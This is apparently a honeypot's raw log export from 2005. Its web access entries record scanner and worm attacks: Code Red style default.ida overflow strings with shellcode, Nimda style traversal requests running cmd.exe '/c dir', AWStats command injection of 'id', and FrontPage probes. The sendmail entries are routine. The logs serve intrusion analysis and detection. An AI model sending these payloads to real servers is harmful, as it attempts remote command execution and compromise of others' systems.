1110686747,access_log,210.116.59.164," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1063 ""-"" ""-"""
1110863218,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863218,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863220,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863220,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863220,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863221,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863221,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863222,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863224,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110868873,access_log,201.9.48.227," ""GET /default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a HTTP/1.0"" 404 1061 ""-"" ""-"""
1110873194,access_log,217.204.59.69," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110885842,access_log,218.6.162.19," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110899269,access_log,24.11.17.100," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110913113,access_log,65.96.54.37," ""GET /NULL.printer"" 404 1061 ""-"" ""-"""
1110925233,access_log,195.70.152.248," ""GET /NULL.printer"" 404 1061 ""-"" ""-"""
1110930324,access_log,62.6.139.11," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110931788,access_log,211.158.94.106," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
1110941142,access_log,218.11.95.43," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110941146,access_log,218.11.95.43," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110941150,access_log,218.11.95.43," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110941154,access_log,218.11.95.43," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110941155,access_log,218.11.95.43," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110941160,access_log,218.11.95.43," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110941161,access_log,218.11.95.43," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110941162,access_log,218.11.95.43," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110951640,access_log,69.67.42.139," ""GET /scripts/nsiislog.dll HTTP/1.1"" 404 1050 ""-"" ""-"""
1110953496,access_log,66.134.74.113," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110958184,access_log,204.102.106.121," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110962881,access_log,68.166.35.226," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110963224,access_log,61.10.7.209," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110965655,access_log,207.243.156.65," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110969323,access_log,71.16.50.10," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969324,access_log,71.16.50.10," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969324,access_log,71.16.50.10," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969325,access_log,71.16.50.10," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969325,access_log,71.16.50.10," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969325,access_log,71.16.50.10," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969326,access_log,71.16.50.10," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969326,access_log,71.16.50.10," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969326,access_log,71.16.50.10," ""GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969327,access_log,71.16.50.10," ""GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969327,access_log,71.16.50.10," ""GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969327,access_log,71.16.50.10," ""GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969327,access_log,71.16.50.10," ""GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
1110969328,access_log,71.16.50.10," ""GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
1110969328,access_log,71.16.50.10," ""GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110969328,access_log,71.16.50.10," ""GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110976930,access_log,66.171.199.116," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110979420,access_log,64.83.24.184," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110980816,access_log,66.30.71.74," ""GET /NULL.printer"" 404 1061 ""-"" ""-"""
1110983346,access_log,208.62.177.10," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110983368,access_log,209.120.201.177," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983369,access_log,209.120.201.177," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983371,access_log,209.120.201.177," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983372,access_log,209.120.201.177," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983373,access_log,209.120.201.177," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983374,access_log,209.120.201.177," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983375,access_log,209.120.201.177," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983376,access_log,209.120.201.177," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983378,access_log,209.120.201.177," ""GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983379,access_log,209.120.201.177," ""GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983381,access_log,209.120.201.177," ""GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983382,access_log,209.120.201.177," ""GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983383,access_log,209.120.201.177," ""GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
1110983384,access_log,209.120.201.177," ""GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
1110983385,access_log,209.120.201.177," ""GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110983386,access_log,209.120.201.177," ""GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110987905,access_log,65.16.76.54," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1062 ""-"" ""-"""
1110988230,access_log,65.16.76.54," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1062 ""-"" ""-"""
1110997397,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997397,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997397,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997399,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997399,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997400,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997400,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997401,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997401,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1110997401,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
1111000130,access_log,67.81.23.243," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1111002115,access_log,202.122.16.7," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1063 ""-"" ""-"""
1111002561,access_log,220.170.151.237," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1111005318,access_log,64.83.24.184," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1111018092,access_log,222.166.160.138," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1111034535,access_log,61.10.7.45," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1111037480,access_log,69.107.121.41," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1111038184,access_log,201.9.104.83," ""GET /default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a HTTP/1.0"" 404 1061 ""-"" ""-"""
1111047996,access_log,207.10.54.33," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1111050725,access_log,68.98.176.140," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1111053985,access_log,68.250.190.161," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1111059507,access_log,219.150.244.58," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110687376,mail_log,-,"combo sendmail[26065]: j2D9FD3X026065: from=root, size=39455, class=0, nrcpts=1, msgid=<200503130915.j2D9FD3X026065@combo.honeypotbox.com>, relay=root@localhost"
1110687394,mail_log,127.0.0.1,"combo sendmail[26067]: j2D9GH6S026067: from=<root@combo.honeypotbox.com>, size=39751, class=0, nrcpts=1, msgid=<200503130915.j2D9FD3X026065@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
1110687394,mail_log,127.0.0.1,"combo sendmail[26065]: j2D9FD3X026065: to=root, ctladdr=root (0/0), delay=00:01:21, xdelay=00:00:17, mailer=relay, pri=30241, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2D9GH6S026067 Message accepted for delivery)"
1110687394,mail_log,-,"combo sendmail[26068]: j2D9GH6S026067: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:01, xdelay=00:00:00, mailer=local, pri=69989, dsn=2.0.0, stat=Sent"
1110773182,mail_log,-,"combo sendmail[10169]: j2E96MKL010169: from=root, size=1045, class=0, nrcpts=1, msgid=<200503140906.j2E96MKL010169@combo.honeypotbox.com>, relay=root@localhost"
1110773207,mail_log,127.0.0.1,"combo sendmail[10172]: j2E96M6S010172: from=<root@combo.honeypotbox.com>, size=1359, class=0, nrcpts=1, msgid=<200503140906.j2E96MKL010169@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
1110773207,mail_log,127.0.0.1,"combo sendmail[10169]: j2E96MKL010169: to=root, ctladdr=root (0/0), delay=00:00:25, xdelay=00:00:25, mailer=relay, pri=30056, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2E96M6S010172 Message accepted for delivery)"
1110773207,mail_log,-,"combo sendmail[10173]: j2E96M6S010172: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:00, xdelay=00:00:00, mailer=local, pri=31602, dsn=2.0.0, stat=Sent"
1110773897,mail_log,-,"combo sendmail[10384]: j2E9HFPa010384: from=root, size=39406, class=0, nrcpts=1, msgid=<200503140917.j2E9HFPa010384@combo.honeypotbox.com>, relay=root@localhost"
1110773915,mail_log,127.0.0.1,"combo sendmail[10386]: j2E9II6S010386: from=<root@combo.honeypotbox.com>, size=39702, class=0, nrcpts=1, msgid=<200503140917.j2E9HFPa010384@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
1110773915,mail_log,127.0.0.1,"combo sendmail[10384]: j2E9HFPa010384: to=root, ctladdr=root (0/0), delay=00:01:20, xdelay=00:00:17, mailer=relay, pri=30241, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2E9II6S010386 Message accepted for delivery)"
1110773916,mail_log,-,"combo sendmail[10387]: j2E9II6S010386: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:01, xdelay=00:00:01, mailer=local, pri=69940, dsn=2.0.0, stat=Sent"
1110844066,mail_log,211.158.69.89,combo sendmail[12661]: j2F4lk6S012661: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12651]: j2F4lk6S012651: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12652]: j2F4lk6S012652: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12656]: j2F4lk6S012656: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12662]: j2F4lk6S012662: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12644]: j2F4lk6S012644: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12653]: j2F4lk6S012653: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12659]: j2F4lk6S012659: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12650]: j2F4lk6S012650: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12649]: j2F4lk6S012649: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12643]: j2F4lk6S012643: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12645]: j2F4lk6S012645: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
1110844066,mail_log,211.158.69.89,combo sendmail[12646]: j2F4lk6S012646: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
